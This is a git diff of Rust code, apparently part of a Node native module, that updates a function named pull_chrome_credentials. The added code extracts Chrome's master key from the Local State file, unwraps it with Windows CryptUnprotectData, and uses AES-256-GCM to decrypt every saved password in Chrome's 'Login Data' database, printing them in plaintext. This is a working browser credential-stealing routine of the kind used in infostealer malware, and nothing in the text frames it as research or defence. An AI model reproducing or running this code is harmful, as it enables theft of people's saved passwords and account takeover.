@@ -4,9 +4,10 @@ use neon::prelude::*;
 
 use dirs::home_dir;
 
-use serde_json::from_slice;
+use aes_gcm::aead::{generic_array::GenericArray, Aead, NewAead};
+use aes_gcm::Aes256Gcm;
 
-use rusqlite::{Connection, OpenFlags, Result};
+use rusqlite::{Connection, OpenFlags};
 
 use crate::cryptos::win::bindings::Windows::Win32::Security::CryptUnprotectData;
 use crate::cryptos::win::bindings::Windows::Win32::Security::Cryptography::Core::CRYPTOAPI_BLOB;
@@ -29,6 +30,33 @@ pub fn pull_chrome_credentials() -> ExtractorResult<()> {
 
     let json_val: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(local_state_path)?)?;
 
+    let mut crypt_key = base64::decode(json_val["os_crypt"]["encrypted_key"].as_str().unwrap()).unwrap()[5..].to_vec();
+
+    let mut crypt_blob = CRYPTOAPI_BLOB {
+        cbData: crypt_key.len() as u32,
+        pbData: crypt_key.as_mut_ptr(),
+    };
+
+    let mut output = CRYPTOAPI_BLOB::default();
+
+    let encrypted_key = unsafe {
+        if !CryptUnprotectData(
+            &mut crypt_blob,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            0,
+            &mut output,
+        ).as_bool() {
+            println!("Cannot decrypt data");
+        };
+
+        GenericArray::from_slice(std::slice::from_raw_parts(output.pbData, output.cbData as usize))
+    };
+
+    let cipher = Aes256Gcm::new(encrypted_key);
+
     let login_data_path = chrome_path.join(["Default", "Login Data"].iter().collect::<PathBuf>());
 
     let conn = Connection::open_with_flags(&login_data_path, OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX)?;
@@ -40,37 +68,13 @@ pub fn pull_chrome_credentials() -> ExtractorResult<()> {
     println!("{:?}", login_data_path);
 
     while let Some(row) = res.next()? {
-        let mut s: Vec<u8> = row.get(2)?;
+        let s: Vec<u8> = row.get(2)?;
 
-        let mut blob_data = CRYPTOAPI_BLOB {
-            cbData: s.len() as u32,
-            pbData: s.as_mut_ptr(),
-        };
+        let nonce = GenericArray::from_slice(&s[3..15]);
 
-        unsafe {
-            let mut output = CRYPTOAPI_BLOB::default();
+        let plain = cipher.decrypt(nonce, &s[15..]).unwrap();
 
-            if !CryptUnprotectData(
-                &mut blob_data,
-                std::ptr::null_mut(),
-                std::ptr::null_mut(),
-                std::ptr::null_mut(),
-                std::ptr::null_mut(),
-                0,
-                &mut output,
-            ).as_bool() {
-                println!("Cannot decrypt data");
-            };
-
-            let password: Vec<u8> = std::slice::from_raw_parts(output.pbData, output.cbData as usize)
-                .iter()
-                .cloned()
-                .collect();
-
-            println!("{:?}", std::str::from_utf8(&password).unwrap());
-        }
-
-        println!("data: {:?}", s);
+        println!("data: {:?}", std::str::from_utf8(&plain));
     }
 
     Ok(())
